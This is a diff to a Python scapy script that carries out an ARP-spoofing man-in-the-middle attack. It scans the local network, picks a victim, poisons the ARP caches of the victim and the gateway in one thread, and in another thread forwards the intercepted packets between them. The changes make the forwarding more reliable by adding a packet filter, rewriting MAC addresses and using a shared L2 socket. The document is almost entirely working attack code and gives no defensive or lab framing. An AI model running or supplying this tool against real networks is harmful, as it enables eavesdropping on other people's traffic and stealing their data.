@@ -128,18 +128,27 @@ def arp_spoof(chosen_ip, gateway_ip, my_mac, victim_mac, gateway_mac):
 
 # forwards the packets to their normal addresses
 def packets_forwarding():
-    sniff(prn=forward, filter="ip")
+    sniff(prn=forward, lfilter=filter_packets, store=0)
     return
 
 
+# change the packets destination (victim->gateway, gateway->victim)
 def forward(packet):
     if packet[IP].src == chosen_ip and packet[Ether].dst == my_mac:
+        packet[Ether].src = my_mac
         packet[Ether].dst = gateway_mac
-        sendp(packet, verbose=0)
-    elif packet[IP].src == default_gate and packet[IP].dst == chosen_ip:
+        sock.send(packet)
+    elif packet[IP].dst == chosen_ip:
+        packet[Ether].src = my_mac
         packet[Ether].dst = chosen_mac
-        sendp(packet, verbose=0)
+        sock.send(packet)
     return
+
+
+# filter for ip packets that came from the gateway or the victim
+def filter_packets(packet):
+    return IP in packet and (packet[Ether].src == chosen_mac or packet[Ether].src == gateway_mac)
+
 
 if __name__ == '__main__':
     ip, subnet, default_gate = get_configs()
@@ -153,7 +162,7 @@ if __name__ == '__main__':
         print("scan failed")
         exit(1)
 
-    # if the scan didnt get the gateway, scan the gateway until it receives its ip
+    # if the scan didn't get the gateway, scan the gateway until it receives its ip
     if not gateway_mac:
         gateway_mac = scan_gateway(default_gate)
 
@@ -168,16 +177,21 @@ if __name__ == '__main__':
             chosen_mac = client['mac']
 
     if chosen_mac:
+        # creating a single socket for all the packets that scapy send
+        sock = conf.L2socket()
         try:
             # creates a spoofing thread
             spoof_thread = threading.Thread(target=arp_spoof,
                                             args=(chosen_ip, default_gate,
                                                   my_mac, chosen_mac, gateway_mac,))
             spoof_thread.start()
+
+            # creates a ip forwarding thread
             forwarding_thread = threading.Thread(target=packets_forwarding)
             forwarding_thread.start()
-        except Exception:
-            print("finish")
+
+        except Exception as e:
+            print("finish " + str(e))
     else:
         print("Doesnt have mac")
 
